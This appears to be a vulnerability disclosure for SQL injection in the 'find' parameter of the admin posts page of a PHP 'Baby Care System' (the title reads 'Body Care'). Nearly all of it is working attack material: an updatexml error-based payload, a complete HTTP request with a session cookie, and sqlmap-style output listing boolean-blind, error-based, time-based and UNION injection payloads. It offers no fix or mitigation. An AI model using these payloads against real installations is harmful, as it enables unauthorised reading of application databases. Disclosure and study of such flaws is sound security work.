## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html

Vulnerability file: /BabyCare/admin/posts.php&find=

![image](https://user-images.githubusercontent.com/54017627/161251169-fb304c0e-972a-45c4-acb8-64c15f1bf42b.png)

![image](https://user-images.githubusercontent.com/54017627/161251293-bfc29370-3124-49a7-b55c-864796735cd6.png)

Vulnerability location: /BabyCare/admin.php?id=posts&find= //find is Injection point

[+]Payload:  /BabyCare/admin.php?id=posts&find=3%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ //find is Injection point

```sql
GET /BabyCare/admin.php?id=posts&find=3%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ HTTP/1.1
Host: 192.168.1.19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=v8g2iaa0tsnt5b01btt83eb7qo
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/161250971-61b1efcc-ed1b-4d03-be36-bffa33d10507.png)

```sql
---
Parameter: find (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=posts&find=3' RLIKE (SELECT (CASE WHEN (6593=6593) THEN 3 ELSE 0x28 END))-- zXvu

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=posts&find=3' AND (SELECT 3959 FROM(SELECT COUNT(*),CONCAT(0x7170787071,(SELECT (ELT(3959=3959,1))),0x7178787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IVWt

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=posts&find=3' AND (SELECT 4643 FROM (SELECT(SLEEP(5)))bafh)-- GSoV

    Type: UNION query
    Title: MySQL UNION query (NULL) - 8 columns
    Payload: id=posts&find=3' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170787071,0x65476d614a4d4d69526c636a4e486f436b45485a67484d67736e4e47657a654761684c644d734557,0x7178787171),NULL#
---
```

![image](https://user-images.githubusercontent.com/54017627/161250913-dbf1b24c-34e2-4b69-9a19-8cab36caa69d.png)

